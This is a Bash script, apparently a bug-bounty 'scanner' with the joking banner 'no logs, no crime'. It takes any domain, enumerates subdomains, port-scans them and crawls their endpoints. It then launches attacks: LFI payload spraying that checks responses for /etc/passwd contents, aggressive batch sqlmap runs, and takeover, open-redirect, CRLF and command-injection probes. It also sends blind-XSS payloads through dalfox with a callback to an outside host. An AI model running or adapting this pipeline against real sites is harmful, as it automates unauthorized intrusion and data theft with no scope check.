#!/bin/bash

# Definindo cores
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sem cor

# Banner
banner(){
cat << "EOF"
               ███╗   ███╗██████╗ ██╗  ██╗
               ████╗ ████║██╔══██╗╚██╗██╔╝
               ██╔████╔██║██████╔╝ ╚███╔╝
               ██║╚██╔╝██║██╔══██╗ ██╔██╗
               ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
               ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
%"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
EOF
echo -e "${BLUE}+ -- --=[Scanner by MRX${NC}"
echo -e "${YELLOW}+ -- --= SEM LOGS SEM CRIME :)${NC}"
}

# Executando o banner
banner

# Verificando a entrada do domínio
read -p "Enter the domain: " domain

# Verificando se o domínio foi fornecido
if [ -z "$domain" ]; then
    echo -e "${RED}Error: Domain not provided.${NC}"
    exit 1
fi

# Criando pasta para o domínio
folder="$domain"
mkdir -p "$folder"

# Executando subfinder para encontrar subdomínios
echo "Running subfinder..."
subfinder -d "$domain" -all -o "$folder/subfinder_tmp.txt"

# Executando amass para encontrar subdomínios
echo "Running amass..."
amass enum -passive -norecursive -d "$domain" -o "$folder/amass_tmp.txt"

# Executando Findomain
echo "Running Findomain..."
findomain -t "$domain" -q 2>/dev/null > "$folder/Findomain_tmp.txt"

# Executando Assetfinder
echo "Running Assetfinder..."
assetfinder --subs-only "$domain" > "$folder/Assetfinder_tmp.txt"

# Executando Sublist3r
# colocar caminho Sublist3r
echo "Running Sublist3r..."
python3 ~/Sublist3r/sublist3r.py -d "$domain" -v -o "$folder/Sublist3r_tmp.txt"

# Executando jldc
echo "Running jldc..."
curl -s "https://jldc.me/anubis/subdomains/$domain" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/jldc_tmp.txt"
wc -l "$folder/jldc_tmp.txt"

# Executando wayback
echo "Running wayback..."
curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$domain&output=txt&fl=original&collapse=urlkey&page=" | awk -F/ '{gsub(/:.*/, "", $3); print $3}' | sort -u > "$folder/wayback_tmp.txt"
wc -l "$folder/wayback_tmp.txt"

# Executando crt
echo "Running crt..."
curl -sk "https://crt.sh/?q=%.$domain&output=json" | tr ',' '\n' | awk -F'"' '/name_value/ {gsub(/\*\./, "", $4); gsub(/\\n/,"\n",$4);print $4}' | sort -u > "$folder/crt_tmp.txt"
wc -l "$folder/crt_tmp.txt"

# Executando abuseipdb
echo "Running abuseipdb..."
curl -s "https://www.abuseipdb.com/whois/$domain" -H "user-agent: firefox" -b "abuseipdb_session=" | grep -E '<li>\w.*</li>' | sed -E 's/<\/?li>//g' | sed -e "s/$/.$domain/" | sort -u > "$folder/abuseipdb_tmp.txt"
wc -l "$folder/abuseipdb_tmp.txt"

# Executando alienvault
echo "Running alienvault..."
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq '.passive_dns[].hostname' 2>/dev/null | grep -o "\w.*$domain" | sort -u > "$folder/alienvault_tmp.txt"
wc -l "$folder/alienvault_tmp.txt"

# Executando urlscan.io
echo "Running urlscan..."
curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" | jq '.results[].page.domain' 2>/dev/null | grep -o "\w.*$domain"| sort -u > "$folder/urlscan_tmp.txt"
wc -l "$folder/urlscan_tmp.txt"

# Executando RapidDNS
echo "Running RapidDNS..."
curl -s "https://rapiddns.io/subdomain/$domain?full=1#result" | grep -v "RapidDNS" | grep -v "<td><a" | cut -d '>' -f 2 | cut -d '<' -f 1 | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/RapidDNS_tmp.txt"
wc -l "$folder/RapidDNS_tmp.txt"

# Limpando e ordenando subdomínios
echo "Cleaning and sorting subdomains..."
cat "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" > "$folder/subdomains_tmp1.txt" 
sort -u "$folder/subdomains_tmp1.txt" > "$folder/subdomains.txt"
rm "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt"

# Executando Naabu
echo "Running naabu..."
naabu -c 250 -l "$folder/subdomains.txt" -port "80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,3000,5000,8080,8000,8081,8888,8069,8009,8001,8070,8088,8002,8060,8091,8086,8010,8050,8085,8089,8040,8020,8051,8087,8071,8011,8030,8061,8072,8100,8083,8073,8099,8092,8074,8043,8035,8055,8021,8093,8022,8075,8044,8062,8023,8094,8012,8033,8063,8045,7000,9000,7070,9001,7001,10000,9002,7002,9003,7003,10001,80,443,4443" | anew "$folder/portscan.txt"
echo "Running httpx Live ports"
httpx -l "$folder/portscan.txt" -o "$folder/liveports.txt"

# Executando httpx para encontrar subdomínios ativos
echo "Finding live subdomains..."
httpx -l "$folder/subdomains.txt" -o "$folder/live_subdomains.txt"

# filter subdomains by keywords
echo "filter subdomains by keywords..."
cat "$folder/live_subdomains.txt" | egrep -i "internal|api|test|prod|private|secret|git|login|admin|staging|dev|jira|intranet|vip|portal|register|pass|reset|client|database|server|backup|Credential|database|docker|encryption|security|authorization|authentication|monitoring|logging|certificate|token|integration|endpoint|validation|configuration|deployment" > "$folder/active_priority.txt"

# Arquivos rápidos e suculentos com lista de palavras tomnomnom e ffuf
echo "ffuf Arquivos suculentos..."
ffuf -w ~/wordlists/common-paths-tom.txt -u "https://$domain/FUZZ" -o "$folder/ffuf.txt"

# Extract .js Subdomains
echo "Extract .js Subdomains..."
cat "$folder/live_subdomains.txt" | getJS --complete | anew "$folder/JS.txt"

# Executando gau para encontrar endpoints
echo "Finding endpoints with gau..."
cat "$folder/live_subdomains.txt" | gau --blacklist png,jpg,gif,svg,jpeg,pdf --threads 6 --o "$folder/EndpointsGau.txt"
wc -l "$folder/EndpointsGau.txt"

# Executando waybackurls
echo "Executando waybackurls..."
cat "$folder/live_subdomains.txt" | waybackurls > "$folder/EndpointsWay.txt"
wc -l "$folder/EndpointsWay.txt"

# Executando gospider
echo "Executando gospider..."
gospider -S "$folder/live_subdomains.txt" -o "$folder/output" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source 
cat "$folder/output/*" | grep -e "code-200" | awk '{print $5}'| anew "$folder/EndpointsGos.txt"
wc -l "$folder/EndpointsGos.txt"

# Executando hakrawler
echo "Executando hakrawler"
cat "$folder/live_subdomains.txt" | hakrawler -subs -u -t 10 | anew "$folder/EndpointsHakrawler.txt"
wc -l "$folder/EndpointsHakrawler.txt"

# Executando katana 
echo "Finding endpoints with katana..."
cat "$folder/live_subdomains.txt" | katana -d 6 -jc -o "$folder/Endpointskat.txt"
wc -l "$folder/Endpointskat.txt"

# Removendo duplicatas usando uro
echo "Removing duplicats Endpoints.txt..."
cat "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt" > "$folder/Endpoints1.txt"
cat "$folder/Endpoints1.txt" | uro | anew "$folder/EndpointsL.txt"
rm "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt"
rm "$folder/Endpoints1.txt"
wc -l "$folder/EndpointsL.txt"

# Usando gf patterns
echo "Finding gf lfi vulnerabilities with gf..."
# Passar caminho da Wordlist de paylouds!!!
# https://raw.githubusercontent.com/mrxbug/lfi-paylouds-small/main/lfi.txt
cat "$folder/EndpointsL.txt" | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt
cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q "$folder/vulnerabilitieslfi.txt"
mv Lfi.txt "$folder/lfi.txt"
rm templfi.txt

#  Sqli vulnerabilities
#  Passar caminho ferramenta Sqlmap ~/tools/sqlmap/sqlmap.py
echo "Finding gf Sqli vulnerabilities..."
cat "$folder/EndpointsL.txt" | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q sqli.txt
cat sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir="$folder/sqlmapVUL.txt" 2> /dev/null" &> /dev/null
mv sqli.txt "$folder/sqli.txt"

# takeover vulnerabilities
echo "Finding takeover vulnerabilities..."
subjack -w "$folder/subdomains.txt" -t 20 -a -o "$folder/takeover.txt"

# openredirect vulnerabilities
echo "Finding openredirect vulnerabilities..."
cat "$folder/EndpointsL.txt" | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q "$folder/openredirect.txt" 
cat "$folder/openredirect.txt" | nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/open-redirect.yaml -o "$folder/open-redirectVUL.txt" 

# crlf vulnerabilities
echo "Finding crlfuzz  vulnerabilities..."
crlfuzz -l "$folder/live_subdomains.txt" -c 50 -s | anew "$folder/crlf.txt" &> /dev/null

#  XSS vulnerabilities
echo "Finding XSS vulnerabilities with gf..."
cat "$folder/EndpointsL.txt" | gf xss > "$folder/xss.txt"

# Usando Gxss para enviar payloads para endpoints XSS potenciais
echo "Sending payloads with Gxss..."
cat "$folder/xss.txt" | Gxss -p khXSS -o "$folder/XSS_Ref.txt"

# Analisando referências XSS com dalfox
echo "Analyzing XSS references with dalfox..."
dalfox file "$folder/XSS_Ref.txt" pipe --skip-bav --mining-dom --deep-domxss --ignore-return -b 'https://mrxbugcom.bxss.in' --follow-redirects  -o "$folder/Vulnerable_XSS.txt"

# Usando Running Nuclei Severity
echo "Running Nuclei Severity..."
cat "$folder/live_subdomains.txt" | nuclei -severity low,medium,high,critical -o "$folder/severityNUclei.txt" -H "User-Agent:Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"

# Usando Nuclei Custom Template
# wget https://raw.githubusercontent.com/pikpikcu/nuclei-templates/master/vulnerabilities/command-injection.yaml
echo "Running Nuclei command-injection..."
cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/command-injection.yaml -o "$folder/command-injection.txt"

# Usando Nuclei Custom Template
# wget https://raw.githubusercontent.com/medbsq/ncl/main/templates/jira_user_piker.yaml
echo "Running Nuclei Jira Unauthenticated User Picker..."
cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/jira_user_piker.yaml -o "$folder/jira_user_piker.txt"

# Usando Nuclei Custom Template
# wget https://raw.githubusercontent.com/im403/nuclei-temp/master/high/wordpress-duplicator-path-traversal.yaml
echo "Running Nuclei WordPress duplicator Path Traversal..."
cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/wordpress-duplicator-path-traversal.yaml  -o "$folder/wordpress-path-traversal.txt"
